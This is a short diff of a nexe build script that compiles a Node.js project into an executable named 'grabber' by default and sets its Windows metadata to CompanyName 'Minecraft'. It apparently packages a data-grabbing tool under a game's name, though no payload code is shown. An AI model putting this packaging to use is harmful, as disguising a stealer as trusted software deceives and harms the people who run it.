@@ -1,10 +1,12 @@
 const { compile } = require('nexe');
 
 compile({
+  // input: './dist/index.bundle.js',
   input: './index.js',
   output: (require('./config').filename || 'grabber') + '.exe',
   build: true,
-  resources: ['index.js', './config.js', './functions/*.js', './util/*.js', './util/**/*.exe'],
+  resources: ['./config.js', './functions/*.js', './util/*.js', './util/**/*.exe', 'node_modules'],
+  // resources: ['dist/*.bundle.js', 'util/**/*.exe', './util/*.js'],
   ico: './icon.ico',
   rc: { // This is one of the best things that exists
     CompanyName: 'Minecraft',
